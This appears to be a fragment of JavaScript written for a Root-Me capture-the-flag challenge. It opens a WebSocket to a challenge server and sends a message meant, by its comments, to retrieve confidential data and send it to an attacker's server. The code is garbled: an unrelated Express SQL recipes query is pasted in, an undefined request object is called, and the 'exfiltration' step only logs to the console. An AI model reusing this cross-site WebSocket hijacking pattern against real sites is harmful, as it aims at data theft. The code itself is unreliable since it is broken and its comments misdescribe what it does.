    websocket = new WebSocket('ws://challenge01.root-me.org:58036/ws')
    websocket.onopen = start
    websocket.onmessage = handleReply
    function start(event) {
        var request={}

        };
    var envoi=   request.query('SELECT * FROM Recipes;', function(err, recordset) {
            //console.log(recordset[0].name.green);
            res.render('recipes/index', {title: 'Recipes', model: recordset});
        });


    websocket.send(envoi); //Send the message to retrieve confidential information

    function handleReply(event) {
    //Exfiltrate the confidential information to attackers server
    console.log(event.data);
    }
   